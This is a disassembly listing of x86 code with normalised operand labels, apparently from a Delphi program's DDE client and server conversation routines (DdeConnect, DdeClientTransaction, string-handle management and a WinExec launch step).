mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_46a314
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_46a354
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_40878c
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_404334
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_46a314
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_404334
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_404334
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_4043f4
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_40878c
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_40878c
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_40349c
xor ecx ecx
xor edx edx
mov eax edi
call sub_46a478
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_46a3cc
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_46a354
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_46a294
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_46a434
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_46a538
xor edx edx
mov eax ebx
call sub_46a54c
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_46a314
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_413de4
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_46a710
dec bx
jne r-xdata
sub_46a354
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402cbc
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_46a3cc
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_413de4
mov edi eax
mov eax edi
call sub_46aa94
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_46a710
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_46a434
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_40349c
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_413de4
call sub_46ab8c
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46a478
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_413de4
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_46a940
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_46a4b8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_404334
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_404334
test eax eax
je r-xdata
mov eax esi
call sub_46a0a0
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
sub_46a5a0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] cl
mov [ esp ] edx
mov ebx eax
mov cl [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_41a400
cmp [ esp + 0x4 ] 0x1
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x9c ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
movzx edi si
mov ebp [ ebx + 0x9c ]
cmp edi [ ebp + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebp
call sub_413de4
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ ebx + 0x9c ]
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax edx
mov edx [ rw-data ]
mov edx [ edx ]
call sub_46a710
inc esi
sub_46a614
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a658
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_46a688
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a703
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x34 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a70a
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x38 ]
call sub_40410c
lea eax [ ebx + 0x38 ]
call sub_404074
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_469f48
mov edx ebx
call sub_41a1b4
mov eax [ ebp - 0x4 ]
call sub_404334
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46a710
sub_46a710
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_4040c8
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x34 ]
call sub_469f80
test al al
jne r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x38 ]
mov edx esi
call sub_4040c8
test [ ebx + 0x1c ] 0x1
je r-xdata
lea eax [ ebx + 0x38 ]
call sub_404074
pop esi
pop ebx
retn
mov eax [ ebx + 0x34 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
cmp [ eax + 0xc5 ] 0x1
je r-xdata
sub_46a76c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41a400
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x34 ]
jne r-xdata
mov edx edi
mov eax [ edi + 0x34 ]
call sub_469f48
xor eax eax
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x38 ]
call sub_404074
sub_46a7a8
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4034cc
test al al
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46a7f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404074
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46a824
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403270
xor eax eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_46a868
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_46ab4c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_46a894
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46a931
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_40410c
cmp [ esi + 0x8 ] 0x0
je r-xdata
lea eax [ esi + 0x4 ]
mov edx edi
call sub_4040c8
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x4 ]
call sub_404334
test eax eax
je r-xdata
mov eax esi
call sub_46ab4c
mov eax esi
call sub_46aa1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a938
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ esi + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ eax + 0xc5 ] 0x1
jne r-xdata
mov eax esi
call sub_46aa94
mov ebx eax
test bl bl
jne r-xdata
mov bl 0x1
lea eax [ esi + 0x4 ]
call sub_404074
jmp r-xdata
sub_46a940
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46aa0d
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46aa84
mov edx eax
lea eax [ ebp - 0x8 ]
call sub_40426c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_46aa1c
jmp r-xdata
mov eax ebx
call sub_46abac
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax ebx
call sub_46aa8c
mov eax [ ebx + 0xc ]
cmp [ eax + 0xc7 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aa14
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax [ ebp - 0x8 ]
call sub_404334
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov esi 0x1
inc esi
dec edi
jne r-xdata
cmp al 0x20
jae r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax + esi - 0x1 ]
test al al
jbe r-xdata
lea eax [ ebp - 0x8 ]
call j_sub_404540#2
mov [ eax + esi - 0x1 ] 0x20
sub_46aa1c
push ebx
push esi
push edi
push ecx
mov edi eax
xor ebx ebx
mov eax [ edi + 0xc ]
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
mov eax edi
call sub_46abac
cmp [ edi + 0x8 ] 0x0
je r-xdata
cmp [ eax + 0xc6 ] 0x1
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x3e8
push 0x20b0
mov eax [ eax + 0xa8 ]
push eax
mov eax [ edi + 0x8 ]
push eax
push edx
push 0xffffffff
push 0x0
call DdeClientTransaction
mov esi eax
test esi esi
je r-xdata
mov edx esi
mov eax edi
call sub_46a940
push esi
call DdeFreeDataHandle
mov bl 0x1
jmp r-xdata
sub_46aa94
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] 0x0
mov eax [ ebx + 0xc ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov al [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_404334
test eax eax
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
lea edx [ esp + 0x4 ]
push edx
push 0x3e8
push 0x1034
mov eax [ ebx + 0xc ]
mov edx [ eax + 0xa8 ]
push edx
mov edx [ ebx + 0x8 ]
push edx
mov eax [ eax + 0x38 ]
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
test eax eax
jne r-xdata
push 0x3ec
mov eax [ ebx + 0x4 ]
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x8 ] eax
mov [ esp ] 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_46ab4c
push ebx
push esi
push ecx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax ebx
call sub_46ab8c
mov al 0x1
pop edx
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
test edx edx
je r-xdata
push esp
push 0x3e8
push 0x8040
mov ecx [ esi + 0xa8 ]
push ecx
push edx
push eax
push 0xffffffff
push 0x0
call DdeClientTransaction
sub_46ab8c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x8 ] eax
sub_46abb8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov [ esi + 0x48 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x30 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_46ac04
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x30 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_46ac44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax esi
call sub_404074
pop esi
pop ebx
retn
mov ecx esi
xor edx edx
mov eax [ ebx + 0x30 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_46ac70
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x48 ] 0x1
mov eax [ ebx + 0x30 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax ebx
call sub_46ad20
pop esi
pop ebx
retn
sub_46ac9c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ad10
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x8 ]
pop edx
call sub_407ea4
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ad17
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
mov [ ebx + 0x48 ] 0x1
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_46ad20
sub_46ad20
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46ada7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3a ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_469b84
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46adae
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov ecx [ ebx + 0x8 ]
mov eax [ rw-data ]
call sub_469b84
sub_46adb4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ae37
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push edi
call DdeAccessData
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ae3e
lea eax [ ebp - 0xc ]
call sub_404074
retn
lea eax [ ebp - 0xc ]
mov edx esi
call sub_40426c
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
call DdeUnaccessData
mov eax ebx
call sub_46ad20
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0x8000
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_46ae5c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41a400
cmp esi [ edi + 0x34 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x34 ] eax
sub_46ae84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov edx esi
mov eax [ rw-data ]
call sub_469be8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_46aec8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_469bfc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_46aefc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_46af87
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
lea eax [ ebp - 0x4 ]
push eax
push edx
call DdeAccessData
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46af8e
lea eax [ ebp - 0xc ]
call sub_404074
retn
cmp [ esi + 0x42 ] 0x0
je r-xdata
mov edi 0x8000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_40426c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ esi + 0x44 ]
call [ esi + 0x40 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_46afc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a0e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x44 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_46b004
push ebx
push esi
push edi
push ebp
call sub_40362c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x34 ]
test eax eax
je r-xdata
push eax
call DdeDisconnect
mov eax [ ebp + 0x44 ]
call sub_4032a0
xor eax eax
mov [ ebp + 0x44 ] eax
inc esi
xor edi edi
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_41a130
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebp + 0x34 ] eax
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_413de4
call sub_4032a0
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_403614
sub_46b088
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x1008 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_46b1a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b1af
lea eax [ ebp - 0x100c ]
mov edx 0x2
call sub_404098
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1001 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1008 ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_4042e4
mov eax [ ebp - 0x1008 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46b3d4
mov edi eax
test edi edi
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b54c
mov esi eax
mov [ esi + 0x3c ] edi
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1001 ]
mov ecx 0x1000
call sub_4042e4
mov edx [ ebp - 0x100c ]
mov eax esi
call sub_46b6a8
mov edx esi
mov eax [ ebx + 0x44 ]
call sub_413c88
mov edx ebx
mov eax esi
call sub_41a1b4
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x34 ] eax
sub_46b1bc
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_46b4f8
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov edx ebx
mov eax [ esi + 0x44 ]
call sub_413f80
mov eax ebx
call sub_4032a0
sub_46b1ec
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1004 ] ebx
mov ebx eax
xor eax eax
push ebp
push sub_46b28f
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b296
lea eax [ ebp - 0x1004 ]
call sub_404074
retn
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1000 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x1004 ]
lea edx [ ebp - 0x1000 ]
mov ecx 0x1000
call sub_4042e4
mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46b3d4
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_46adb4
mov esi eax
sub_46b2a0
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_46aefc
mov edx eax
sub_46b2c0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_46b3c1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_46b4f8
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_4042e4
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_46b3d4
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_46b5c4
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b3c8
lea eax [ ebp - 0x100c ]
call sub_404074
lea eax [ ebp - 0x8 ]
call sub_404074
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_404334
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
